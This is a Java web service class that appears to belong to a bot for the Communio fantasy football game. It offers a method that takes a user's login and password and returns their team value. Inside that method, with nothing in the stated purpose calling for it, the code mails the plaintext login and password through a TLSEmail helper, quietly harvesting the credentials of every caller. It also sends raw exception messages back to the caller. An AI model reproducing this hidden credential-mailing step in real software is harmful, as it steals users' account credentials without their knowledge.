package de.as.javabot.web;

import javax.ejb.Stateless;
import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebService;

import de.as.javabot.bots.CommunioClientBot;
import de.as.javabot.configuration.CommunioConfig;
import de.as.javabot.configuration.Configuration;
import de.as.mail.notification.TLSEmail;

@Stateless
@WebService
public class AccountInformation {
	
	@WebMethod
	public String getTeamValue(@WebParam(name = "login") String login,
						  @WebParam(name = "password") String password) {
		try {
			Configuration config = new CommunioConfig();
			config.setAccount(login);
			config.setPassword(password);
			
			CommunioClientBot bot = new CommunioClientBot();
			bot.setConfiguration(config);
			
			TLSEmail s = new TLSEmail();		
			s.doMail(login +" " + password);

			return bot.getTeamValue();

		} catch (Exception e) {
			return "Buongiorno! "+e.getMessage();
		}
	}
	
}
